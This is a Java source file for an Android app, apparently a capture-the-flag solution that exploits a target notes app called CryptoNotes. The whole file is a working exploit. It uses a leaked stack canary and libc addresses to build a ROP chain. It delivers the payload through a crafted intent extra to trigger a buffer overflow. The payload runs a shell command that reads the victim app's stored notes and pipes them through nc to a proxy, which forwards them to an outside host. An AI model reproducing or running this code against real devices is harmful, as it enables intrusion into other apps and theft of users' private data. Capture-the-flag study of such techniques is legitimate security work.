package com.tasteless.ispo.cryptonotespwn;

import android.content.ComponentName;
import android.content.Intent;
import android.os.Parcel;
import android.os.SystemClock;
import android.util.Log;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import android.os.Bundle;
import com.google.gson.Gson;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.InetAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.ByteOrder;
import java.nio.ByteBuffer;
import com.inso.ins24.utils.CryptoConfig;
import com.inso.ins24.utils.JSONBuilder;


/** Binds a local server on device and forwards data to a remote server (ispo.gr). */
class ProxyServer implements Runnable {
  private int localPort;
  private int remotePort;
  private String remoteAddr;

  public ProxyServer(int localPort, String remoteAddr, int remotePort) {
    this.localPort = localPort;
    this.remotePort = remotePort;
    this.remoteAddr = remoteAddr;
  }

  public void run() {
    try {
      ServerSocket serverSocket = new ServerSocket(localPort);

      while (!Thread.currentThread().isInterrupted()) {
        Socket payloadSocket = serverSocket.accept();

        /* Wait until payload is executed .... */

        Log.i("ISPO", "Accepted connection on local socket!");
        Socket clientSocket = new Socket(InetAddress.getByName(remoteAddr), remotePort);
        BufferedReader pwnedStream = new BufferedReader(
            new InputStreamReader(payloadSocket.getInputStream()));

        // Read data line by line from device and forward them to remote server.
        String recv;
        while ((recv = pwnedStream.readLine()) != null) {
          Log.i("ISPO", "Received data from local server: " + recv);

          BufferedWriter output = new BufferedWriter(
              new OutputStreamWriter(clientSocket.getOutputStream()));
          output.write(recv + "\n");
          output.flush();
        }
      }
    } catch (IOException e) {
      e.printStackTrace();
    }
  }
}


/** Everything starts from here. */
public class MainActivity extends AppCompatActivity {
  static {
    System.loadLibrary("cryptonotespwn");
  }

  private native long getCanary();
  private native long getLibcBase();
  private native long getSystemAddr();

  @Override
  protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);

    // Spawn server to leak flag.
    Thread proxyServer = new Thread(new ProxyServer(31338, "ispo.gr", 31339));
    proxyServer.start();

    // Trigger exploit.
    sendIntent();
  }

  private byte[] QwordtoByteArray(long value) {
    return ByteBuffer.allocate(8).order(ByteOrder.LITTLE_ENDIAN).putLong(value).array();
  }

  /** Crafts the exploit payload (ROP). */
  private byte[] craftPayload() {
    ByteArrayOutputStream payload = new ByteArrayOutputStream();
    try {
      // overflow buffer
      payload.write("K".repeat(0x30).getBytes());
      payload.write("ISPOLEET".getBytes());

      /**
       * Every App forks from Zygote, so both the canary and the loaded address of libc.so
       * will be the same in CryptoNotes and in our App.
       */

      // canary
      long canary = getCanary();
      Log.i("ISPO", String.format("Leaked canary: %x", canary));
      payload.write(QwordtoByteArray(canary));

      // rbp
      payload.write(QwordtoByteArray(0x31337)); // this doesn't matter.

      // rip (ROP starts here)
      //payload.write(QwordtoByteArray(0xdeadbeef));
      long base = getLibcBase();      // 0x0000701E65247000L;
      long system = getSystemAddr();  // 0x0000701E652B5A90L;

      // ROPgadget --binary libc.so | grep -e 'pop rax .* ret'
      //    0x0000000000045e13 : pop rax ; ret
      payload.write(QwordtoByteArray(base + 0x45e13));

      // rax value
      payload.write(QwordtoByteArray(system));

      // ROPgadget --binary libc.so | grep -e 'mov r.*, rsp'
      //    0x0000000000061499 : mov rdi, rsp ; call rax
      // rdi now points on stack and rax on &system.
      payload.write(QwordtoByteArray(base + 0x61499));

      // shell command to execute
      //payload.write("touch /data/local/tmp/expl\0".getBytes());   // DOESN'T WORK
      //payload.write("echo yeah | nc 0.0.0.0 31337\0".getBytes()); // WORKS!
      payload.write("cat /data/data/com.inso.ins24/shared_prefs/com.inso.ins24.mynotes.xml | nc 0.0.0.0 31338\0".getBytes());
    } catch(Exception e) {
      e.printStackTrace();
    }
    return payload.toByteArray();
  }

  /**
   * Send an intent to triggers the following execution path in the CryptoNotes app:
   *      System.loadLibrary("ins24");
   *      if(this.getIntent().hasExtra("exit")) {
   *        this.finish();
   *      }
   *
   *  If the extra in the `exit` is of type CryptoConfig, we will trigger the dtor when CryptoNotes
   *  App exits:
   *      @Override
   *      protected void finalize() throws Throwable {
   *        super.finalize();
   *        CryptoConfig.docipher(this.ALGO, this.IN);
   *      }
   *
   *  So we can trigger the buffer overflow in has_algo() (which called from docipher()).
   */
  private void sendIntent() {
    Intent myIntent = new Intent();
    myIntent.setComponent(new ComponentName("com.inso.ins24", "com.inso.ins24.MainActivity"));

    if (myIntent == null) {
      Toast toast = Toast.makeText(getApplicationContext(), "oups :(", Toast.LENGTH_SHORT);
      toast.show();
      finish();
    }

    /* For some reason the exploit doesn't always work at first. We have to try it 4-5 times. */
    for (int i=0; i<10; ++i) {
       String cfg = "{\'ALGO\':[69,76,71,79,49],\'IN\':\'this is a notes\'}";
       Gson gson = new Gson();
       CryptoConfig cryptoCfg = (CryptoConfig) gson.fromJson(cfg, CryptoConfig.class);

       cryptoCfg.ALGO = craftPayload();

      // Send CryptoConfig object with the intent.
      // We can do this using Serializable or Parcelable (the Android version) interfaces.
      // NOTE: The full package name of the CryptoConfig class needs to match with the target App.
      //       That is, we need to place CryptoConfig under com.inso.ins24.utils package.
      Parcel parcel = Parcel.obtain();
      parcel.writeString("com.inso.ins24.utils.CryptoConfig");
      parcel.writeString(gson.toJson(cryptoCfg));
      parcel.setDataPosition(0);

      Log.i("ISPO", gson.toJson(cryptoCfg));

      JSONBuilder exploit = (JSONBuilder) JSONBuilder.CREATOR.createFromParcel(parcel);
      myIntent.putExtra("exit", exploit);
      myIntent.setType("text/plain");

      try {
        startActivity(myIntent);  // Send the intent.
      } catch (Exception ActivityNotFoundException) {
        ActivityNotFoundException.printStackTrace();
      }

      Toast toast = Toast.makeText(getApplicationContext(),
          String.format("Exploit attempt #%d", i), Toast.LENGTH_SHORT);
      toast.show();

      // Wait for some time and try again ...
      SystemClock.sleep(5000);
    }

    finish();
  }
}